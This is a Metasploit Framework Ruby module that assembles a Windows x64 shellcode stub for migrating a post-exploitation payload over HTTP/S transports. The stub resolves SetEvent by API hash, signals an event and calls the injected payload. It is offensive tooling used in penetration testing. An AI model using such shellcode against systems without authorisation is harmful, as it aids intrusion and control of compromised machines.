# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/x64/block_api'

module Msf

###
#
# Payload that supports migrating over HTTP/S transports on x64.
#
###

module Payload::Windows::MigrateHttp_x64

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi_x64

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Migrate over HTTP/S transports (x64)',
      'Description'   => 'Migration stub to use over HTTP/S transports (x64)',
      'Author'        => ['OJ Reeves'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86_64,
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    asm = %Q^
    migrate:
      cld
      mov rsi, rcx
      sub rsp, 0x2000
      and rsp, ~0xF
      call start
      #{asm_block_api}
    start:
      pop rbp
    signal_event:
      mov rcx, qword [rsi]      ; Event handle is pointed at by rsi
      mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
      call rbp                  ; SetEvent(handle)
    call_payload:
      call qword [rsi+8]        ; call the associated payload
    ^

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

end

end



